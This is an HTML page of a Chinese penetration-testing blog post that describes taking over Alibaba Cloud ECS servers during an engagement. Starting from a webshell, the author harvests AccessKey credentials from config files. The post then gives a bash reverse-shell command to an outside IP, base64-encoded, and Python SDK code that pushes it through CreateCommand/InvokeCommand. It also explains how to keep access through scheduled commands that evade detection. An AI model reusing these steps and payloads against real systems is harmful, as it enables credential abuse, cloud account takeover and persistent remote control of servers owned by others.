@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>阿里云Access Token问题 - 项目收获记录</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/projects/" title="Projects">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-terminal-fill" viewBox="0 0 16 16"><path d="M0 3a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3zm9.5 5.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 0-1zm-6.354-.354a.5.5 0 1 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708L4.793 6.5 3.146 8.146z"/></svg> Projects
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/tools/" title="Tools">
+                        Tools
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<p>Q：在获得权限较低的Webshell的情况下，如何继续扩大收获？</p>
+<p>A：首先，信息搜集，分别包含：当前权限，主机网络环境、系统进程、网络连接状况、散落的凭证等，然后进行战略分析</p>
+<ol>
+<li>是否需要提权</li>
+<li>如何将流量带入（转发）</li>
+<li>结合搜集的信息转化出其他更好的思路</li>
+</ol>
+<p>很巧，我遇到了第三种情况。</p>
+<p><strong>Tips：内网渗透一般提权是最不可取的方案，我们只需要不断搜集信息、撕开一个流量口子即可。</strong></p>
+<h2 id="0x01-阿里云对象存储---oss">0x01 阿里云对象存储 - OSS</h2>
+<p>什么是对象存储？</p>
+<p>阿里云对象存储服务（Object Storage Service，简称OSS），是阿里云对外提供的海量、安全、低成本、高可靠的云存储服务。您可以通过本文档提供的简单的REST接口，在任何时间、任何地点、任何互联网设备上进行上传和下载数据。基于OSS，您可以搭建出各种多媒体分享网站、网盘、个人和企业数据备份等基于大规模数据的服务。</p>
+<p>通过Webshell在目标机器（Linux）的Web站点目录下发现多个子站配置文件<code>config.php</code>，配置了同一个阿里云的OSS地址，只是存储空间（Bucket）不同。</p>
+<p>通常情况下一个阿里云oss地址的组成如下：</p>
+<p><code>http(s)://[BucketName].oss-cn-[Region].aliyuncs.com</code></p>
+<p>BucketName ：存储空间</p>
+<p>Region：地域，目前有如下几个：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b47095f0e521b2c64a785b3cbe165889.png" alt="2019-04-02-20-58-34"></p>
+<p>例如：杭州 = cn-hangzhou</p>
+<h2 id="0x02-access-token">0x02 Access Token</h2>
+<p>Access Token = AccessKeyId + AccessKeySecret</p>
+<p>OSS通过使用AccessKeyId/ AccessKeySecret对称加密的方法来验证某个请求的发送者身份。</p>
+<p>AccessKeyId用于标示用户，AccessKeySecret是用户用于加密签名字符串和OSS用来验证签名字符串的密钥，其中AccessKeySecret必须保密，只有用户和OSS知道。AccessKey 根据所属账号的类型有所区分。</p>
+<p><strong>阿里云账户AccessKey：阿里云账号提供的AccessKey拥有所属资源的全部操作权限</strong></p>
+<p>RAM账户AccessKey：RAM账户由阿里云账号授权生成，所拥有的AccessKey拥有对特定资源限定的操作权限</p>
+<p>STS临时访问凭证：由阿里云账号或RAM账号生成，所拥有的AccessKey在限定时间内拥有对特定资源限定的操作权限。过期权限收回。</p>
+<p><a href="https://help.aliyun.com/document_detail/31867.html?spm=a2c4g.11186623.2.7.60c35869TaDn9K#concept-e4s-mhv-tdb">详细介绍</a></p>
+<h2 id="0x03-通过access-token接管ecs">0x03 通过Access Token接管ECS</h2>
+<p>ECS：云服务器（Elastic Compute Service，简称 ECS）是一种简单高效、处理能力可弹性伸缩的计算服务，帮助您快速构建更稳定、安全的应用，提升运维效率，降低 IT 成本，使您更专注于核心业务创新。</p>
+<p>前面介绍到，默认情况下，阿里云用户获得的Access Token是对当前用户所有服务通用的令牌，在没有使用RAM账户的情况下，就可以使用SDK去操作阿里云所有产品。</p>
+<p>在此次项目里，我接管了四台ECS，执行任意命令，获得最大权限。</p>
+<p>首先，通过读取配置文件，获得了同于上传图片所需要认证的Access Token，如何检验是否可用的呢？</p>
+<pre><code>Access Key Id : *********
+Access Secret : ***************************
+Region : cn-*****
+</code></pre><p>下面直接调用获取ECS实例的API即可，以往情况下，我会使用Python，安装阿里云的sdk-core库，但是现在能在线调试，大大的节省了本地调试的成本：</p>
+<p>DescribeInstances - 获得实例信息</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e2155c603d701fd20696069aea984835.png" alt="2019-04-02-21-11-05"></p>
+<p>只有第一个<code>RegionId</code>是必填项，点击<code>API Explorer</code>，可以直接进入调试环境：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e7013aa30b06a0f6eb76ec22851c92b4.png" alt="2019-04-02-21-12-38"></p>
+<p>服务器上的oss配置中刚好有RegionId，我就直接选择了，然后填入Access Token信息，就可以获得数据。</p>
+<p>我是直接在<code>Alicloud Shell</code>里复制了一份运行的：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/29658b26756b91ad7999c3586697f73a.png" alt="2019-04-02-21-16-55"></p>
+<p>输出结果如下：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/3729d18e5454db84dfdd66b91344ea8c.png" alt="2019-04-02-21-21-17"></p>
+<p>使用<code>json.cn</code>格式化一下：</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6be7a9b9ceb7a55095aba804a63165dc.png" alt="2019-04-02-21-23-48"></p>
+<p>共四台服务器，那么如何执行命令呢？</p>
+<p>首先要创建一条命令，然后指定实例来调用命令，手册地址：</p>
+<p><a href="https://help.aliyun.com/document_detail/64844.html">https://help.aliyun.com/document_detail/64844.html</a></p>
+<p>命令的类型取值范围：</p>
+<ul>
+<li>RunBatScript：创建一个在 Windows 实例中运行的 Bat 脚本</li>
+<li>RunPowerShellScript：创建一个在 Windows 实例中运行的 PowerShell 脚本</li>
+<li>RunShellScript：创建一个在 Linux 实例中运行的 Shell 脚本</li>
+</ul>
+<p>由于都是Linux，我就选择RunShellScript，注意：命令必须是base64encode</p>
+<pre><code>rvn0xsy@Rvn0xsy ~&gt; echo &quot;bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1&quot; | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=
+</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/64788dbca11e1dfd99c53caae568dccc.png" alt="2019-04-02-21-29-22"></p>
+<pre><code>#!/usr/bin/env python
+#coding=utf-8
+
+from aliyunsdkcore.client import AcsClient
+from aliyunsdkcore.acs_exception.exceptions import ClientException
+from aliyunsdkcore.acs_exception.exceptions import ServerException
+from aliyunsdkecs.request.v20140526.CreateCommandRequest import CreateCommandRequest
+
+client = AcsClient('&lt;accessKeyId&gt;', '&lt;accessSecret&gt;', 'cn-shanghai')
+
+request = CreateCommandRequest()
+request.set_accept_format('json')
+
+request.set_Type(&quot;RunShellScript&quot;)
+request.set_CommandContent(&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=&quot;)
+request.set_Name(&quot;test&quot;)
+
+response = client.do_action_with_exception(request)
+# python2:  print(response) 
+print(str(response, encoding='utf-8'))
+
+</code></pre><p>执行成功后，会返回如下信息：</p>
+<pre><code>{
+	&quot;RequestId&quot;: &quot;********-****-****-****-********&quot;,
+	&quot;CommandId&quot;: &quot;c-0************&quot;
+}
+</code></pre><p>CommandId最好记下来，不然还要调用<a href="https://api.aliyun.com/find/Ecs/DescribeCommands?spm=a2c1g.8271268.10000.91.169bdf25hVPFbi">DescribeCommands</a></p>
+<pre><code>{
+	&quot;PageNumber&quot;: 1,
+	&quot;TotalCount&quot;: 1,
+	&quot;PageSize&quot;: 10,
+	&quot;RequestId&quot;: &quot;********-****-****-****-********&quot;,
+	&quot;Commands&quot;: {
+		&quot;Command&quot;: [
+			{
+				&quot;Name&quot;: &quot;test&quot;,
+				&quot;Timeout&quot;: 3600,
+				&quot;CommandContent&quot;: &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=&quot;,
+				&quot;Description&quot;: &quot;&quot;,
+				&quot;Type&quot;: &quot;RunShellScript&quot;,
+				&quot;CommandId&quot;: &quot;c-0************&quot;,
+				&quot;WorkingDir&quot;: &quot;&quot;
+			}
+		]
+	}
+}
+</code></pre><p>紧接着就是<code>InvokeCommand</code>：</p>
+<ul>
+<li>RegionId：区域ID，例如：cn-shanghai</li>
+<li>CommandId：命令ID</li>
+<li>InstanceId：实例ID</li>
+<li>Timed：命令是否为周期执行。 默认值：False</li>
+<li>Frequency：周期任务的执行周期，两次周期任务的时间间隔不能低于10秒。当参数 Timed 的值为 True 时，参数 Frequency 为必需参数。 该参数取值遵循Cron表达式，参阅<a href="https://help.aliyun.com/document_detail/64769.html?spm=a2c4g.11186623.2.21.755e1926kBOlWA">Cron表达式</a>。</li>
+</ul>
+<p>默认情况下，我们不需要管后面的参数，如果你想权限维持的话，可以设置Timed为False，并且设置Frequency为定时任务计划表达式，执行的过程中，基本上不会拦截，因为Access Token的调用，一切都是白名单的。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/af5818d425ef9c61361044a26dd6e804.png" alt="2019-04-02-21-39-17"></p>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
+<script>
+(function(){
+  let plantumlPrefix = "language-plantuml";
+  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
+    let image = document.createElement("IMG");
+    image.loading = 'lazy'; 
+    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
+    code.parentNode.insertBefore(image, code);
+    code.style.display = 'none';
+  });
+})();
+</script>
+
+</body>
+</html>
